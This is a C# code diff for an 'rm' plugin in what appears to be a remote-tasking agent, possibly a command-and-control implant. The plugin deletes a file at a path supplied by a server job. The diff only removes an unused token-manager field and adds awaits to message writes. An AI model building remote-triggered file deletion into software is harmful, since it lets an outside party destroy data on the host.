@@ -10,12 +10,9 @@ namespace Agent
     {
         public string Name => "rm";
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
-
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
@@ -38,13 +35,13 @@ namespace Agent
                 {
                     File.Delete(args.path.Replace("\"", ""));
                 }
-                messageManager.Write($"{args.path} removed.", job.task.id, true);
+                await messageManager.Write($"{args.path} removed.", job.task.id, true);
 
             }
             catch (Exception e)
             {
 
-                messageManager.Write(e.ToString(), job.task.id, true, "error");
+                await messageManager.Write(e.ToString(), job.task.id, true, "error");
                 return;
             }
         }
